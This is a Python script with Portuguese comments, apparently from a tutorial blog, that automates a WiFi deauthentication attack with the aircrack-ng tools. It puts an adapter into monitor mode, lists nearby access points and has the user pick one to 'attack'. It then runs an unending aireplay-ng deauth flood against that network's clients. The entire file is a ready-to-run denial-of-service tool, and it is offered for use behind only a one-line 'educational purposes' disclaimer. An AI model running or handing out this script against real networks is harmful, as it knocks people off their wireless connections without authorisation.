  
#!/usr/bin/env python3
# Isenção de responsabilidade: Este script é apenas para fins educacionais. Não use em nenhuma rede que não seja sua ou que não tenha autorização para testar.

# Usaremos o módulo de subprocesso para executar comandos no Kali Linux .
import subprocess
# Exigimos expressões regulares.
import re
# Queremos abrir os arquivos CSV gerados pelo airmon-ng, 
# e usaremos o módulo csv integrado.
import csv
# Queremos importar os porque queremos verificar sudo
import os
# Queremos usar time.sleep()
import time
# Queremos mover arquivos .csv na pasta se encontrarmos algum. 
# Usaremos shutil para isso.
import shutil
# Crie um carimbo de data/hora para o nome do arquivo .csv
from datetime import datetime

# Cria uma lista vazia
active_wireless_networks = []

# Usamos esta função para testar se o ESSID já está no arquivo de lista. 
# Se sim, retornamos False para não adicionar novamente.
# Se não estiver no lst retornamos True que instruirá o elif 
# instrução para adicioná-lo ao lst.
def check_for_essid(essid, lst):
    check_status = True

    # Se não houver ESSIDs na lista, adicione a linha
    if len(lst) == 0:
        return check_status

    # Isso só será executado se houver pontos de acesso sem fio na lista.
    for item in lst:
        # Se True não adiciona à lista. False irá adicioná-lo à lista
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# Cabeçalho básico da interface do usuário
print(r""" _         _     _                                      _                 
| |__   __| |___| |_ ___  ___ _ __   ___  ___ _   _ ___| |_ ___ _ __ ___  
| '_ \ / _` / __| __/ _ \/ __| '_ \ / _ \/ __| | | / __| __/ _ \ '_ ` _ \ 
| |_) | (_| \__ \ ||  __/ (__| | | | (_) \__ \ |_| \__ \ ||  __/ | | | | |
|_.__/ \__,_|___/\__\___|\___|_| |_|\___/|___/\__, |___/\__\___|_| |_| |_|
                                              |___/                    """)
print("\n****************************************************************")
print("\n* BDSTECNOSYSTEM    2022                                       *")
print("\n* https://bdstecnosystem.blogspot.com/                         *")
print("\n* https://www.youtube.com/@bdstecnosystem                      *")
print("\n****************************************************************")


# Se o usuário não executar o programa com privilégios de superusuário, não permita que ele continue.
if not 'SUDO_UID' in os.environ.keys():
    print("Tente executar este programa com sudo.")
    exit()

# Remova os arquivos .csv antes de executar o script.
for file_name in os.listdir():
    # Devemos ter apenas um arquivo csv, pois os excluímos da pasta 
    #  toda vez que executamos o programa.
    if ".csv" in file_name:
        print("Não deve haver nenhum arquivo .csv em seu diretório. Encontramos arquivos .csv em seu diretório e os moveremos para o diretório de backup.")
        # Obtemos o diretório de trabalho atual.
        directory = os.getcwd()
        try:
            # Criamos um novo diretório chamado /backup
            os.mkdir(directory + "/backup/")
        except:
            print("A pasta de backup existe.")
        # Cria um timestamp
        timestamp = datetime.now()
        # Movemos todos os arquivos .csv da pasta para a pasta de backup.
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex para encontrar interfaces sem fio. Estamos supondo que todos serão wlan0 ou superior.
wlan_pattern = re.compile("wlan[0-9]")

# O Python permite é executar comandos do sistema usando uma função fornecida pelo módulo de subprocesso. 
# subprocess.run(<lista de argumentos de linha de comando vai aqui>)
# O script é o processo pai e cria um processo filho que executa o comando do sistema, 
# e só continuará depois que o processo filho for concluído.
# Executamos o comando iwconfig para procurar interfaces wireless.
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode()) 
# Nenhum adaptador WiFi conectado.
if len(check_wifi_result) == 0:
    print("Por favor, conecte um adaptador WiFi e tente novamente.")
    exit()

# Menu para selecionar a interface WiFi de
print("As seguintes interfaces WiFi estão disponíveis:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Certifique-se de que a interface WiFi selecionada seja válida. Menu simples com interfaces para selecionar.
while True:
    wifi_interface_choice = input("Por favor, selecione a interface que deseja usar para o ataque: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Digite um número que corresponda às opções disponíveis.")

# Para facilitar a referência, chamamos a interface selecionada de hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]

# Diga ao usuário que vamos matar os processos conflitantes.
print("Adaptador WiFi conectado! \n Agora vamos eliminar processos conflitantes:")

# subprocess.run(<lista de argumentos de linha de comando vai aqui>)
# O script é o processo pai e cria um processo filho que executa o comando do sistema, 
# e só continuará depois que o processo filho for concluído.
# Executamos o comando iwconfig para procurar interfaces wireless.
# Matando todos os processos conflitantes usando airmon-ng
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Colocar wireless no modo Monitor
print("Colocando o adaptador Wifi em modo monitorado:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# subprocess.Popen(<lista de argumentos de linha de comando vai aqui>)
# O método Popen abre um pipe a partir de um comando.. 
# A saída é um arquivo aberto que pode ser acessado por outros programas.
# Executamos o comando iwconfig para procurar interfaces wireless.
# Descubra pontos de acesso
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Loop que mostra os pontos de acesso sem fio. Usamos um bloco try except e sairemos do loop pressionando ctrl-c.
try:
    while True:
        # Queremos limpar a tela antes de imprimir as interfaces de rede.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                # Devemos ter apenas um arquivo csv, pois fazemos backup de todos os arquivos csv anteriores da pasta toda vez que executamos o programa. 
                # A lista a seguir contém os nomes dos campos para as entradas csv.
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # Isso será executado várias vezes e precisamos redefinir o cursor para o início do arquivo.
                        csv_h.seek(0)
                        # Usamos o método DictReader e dizemos a ele para pegar o conteúdo csv_h e então aplicar o dicionário com os nomes dos campos que especificamos acima. 
                        # Isso cria uma lista de dicionários com as chaves conforme especificado nos nomes dos campos.
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            # Queremos excluir a linha com BSSID.
                            if row["BSSID"] == "BSSID":
                                pass
                            # Não estamos interessados ​​nos dados do cliente.
                            elif row["BSSID"] == "Station MAC":
                                break
                            # Cada campo onde um ESSID é especificado será adicionado à lista.
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Digitalizando. Pressione Ctrl+C quando quiser selecionar qual rede sem fio deseja atacar. \n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            # Estamos usando a instrução print com uma string f. 
            # F-strings são uma maneira mais intuitiva de incluir variáveis ​​ao imprimir strings, 
            # em vez de concatenações feias.
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # Colocamos o script em suspensão por 1 segundo antes de carregar a lista atualizada.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nPronto para fazer a escolha.")

# Certifique-se de que a escolha de entrada seja válida.
while True:
    # Se você não fizer uma escolha entre as opções disponíveis na lista, 
    # você será solicitado a tentar novamente.
    choice = input("Por favor, selecione uma opção acima: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Por favor, tente novamente.")

# Para facilitar o trabalho e a leitura do código, atribuímos os resultados às variáveis.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Mude para o canal em que queremos realizar o ataque DOS. 
# O monitoramento ocorre em um canal diferente e precisamos configurá-lo para esse canal. 
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Desautentique clientes usando um subprocesso. 
# O script é o processo pai e cria um processo filho que executa o comando do sistema, 
# e só continuará depois que o processo filho for concluído.
subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

# O usuário precisará usar control-c para quebrar o script.
try:
    while True:
        print("Desautenticando clientes, pressione ctrl-c para parar")
except KeyboardInterrupt:
    print("parar modo de monitoramento")
    # We run a subprocess.run command where we stop monitoring mode on the network adapter.
    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    print("Obrigado ! saindo agora")

